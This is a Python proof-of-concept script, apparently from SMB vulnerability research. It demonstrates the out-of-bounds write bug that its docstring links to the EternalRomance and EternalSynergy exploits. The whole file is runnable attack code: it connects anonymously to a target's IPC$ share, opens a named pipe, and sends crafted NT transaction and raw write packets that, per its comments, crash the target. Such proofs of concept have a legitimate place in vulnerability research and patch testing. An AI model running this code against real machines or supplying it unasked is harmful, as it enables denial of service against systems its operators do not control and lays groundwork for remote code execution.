#!/usr/bin/python
from impacket import smb
from mysmb import MYSMB
import sys

'''
PoC: demonstrates the bug that NSA eternalromance and eternalsynergy use for OOB write
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 3:
	print("{} <ip> <pipe_name>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = sys.argv[2]

conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)

fid = conn.nt_create_andx(tid, pipe_name)

# create incomplete transaction with mid is pipe fid
conn.send_nt_trans(0, mid=fid, totalDataCount=0x5400)

# use SMB write to shift transaction.InData
conn.do_write_andx_raw_pipe(fid, 'A'*0x1000)

# send secondary for OOB write
# after sending below secondary, a target should be crashed
conn.send_nt_trans_secondary(fid, data='Z'*0x1000, dataDisplacement=0x4000)

conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
